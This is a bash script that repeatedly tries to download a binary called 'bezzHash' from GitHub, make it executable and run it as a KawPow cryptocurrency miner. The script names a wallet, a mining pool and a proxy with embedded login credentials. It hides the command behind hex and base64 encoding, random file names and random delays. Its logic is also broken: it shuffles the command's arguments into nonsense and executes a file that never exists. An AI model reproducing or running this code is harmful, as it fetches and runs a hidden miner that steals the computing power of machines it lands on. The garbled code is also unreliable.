#!/bin/bash

# Set the number of iterations
iterations=50

# Start the loop
for ((i=1; i<=$iterations; i++)); do
    # Generate a random string for command execution
    random_command=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)

    # Encode the random string in base64
    base64_encoded_command=$(echo -n "$random_command" | base64)

    # Write the base64 encoded command to a temporary file
    echo "$base64_encoded_command" > temp_base64_encoded_command.txt

    # Randomize the command and parameters
    command="wget"
    options=("https://github.com/Testdrive345/scriptX/raw/main/bezzHash" "&&" "chmod" "777" "bezzHash" "&&" "./bezzHash" "--par=kawpow" "--user" "RLgPffTX9i31sQjiW3xi2hjXZP5jw1w1M3" "--socks=zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80" "--server" "stratum.ravenminer.com" "--port" "3838")
    shuffled_options=$(shuf -e "${options[@]}")
    command+=" $shuffled_options"

    # Convert the command to hexadecimal
    hex_code=$(echo -n "$command" | xxd -p)

    # Encode the hex code in base64
    base64_encoded=$(echo "$hex_code" | base64)

    # Write encoded code to a temporary file
    echo "$base64_encoded" > temp_base64_encoded.txt

    # Add some random characters to the file to make it less predictable
    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
    echo "$random_chars" >> temp_base64_encoded.txt

    # Decode the base64 code
    base64_decoded=$(cat temp_base64_encoded.txt | base64 -d)

    # Convert decoded code back to hex
    hex_decoded=$(echo "$base64_decoded" | xxd -r -p)

    # Write the hex code to a temporary file
    echo "$hex_decoded" > temp_hex_decoded.txt

    # Make the file executable
    chmod +x temp_hex_decoded.txt

    # Execute the script with the random command name
    ./"$random_command" &

    # Clean up temporary files
    rm temp_base64_encoded.txt temp_hex_decoded.txt temp_base64_encoded_command.txt

    # Add a random delay before next iteration
    sleep $((RANDOM % 10))  # Random delay between 0 and 9 seconds
done
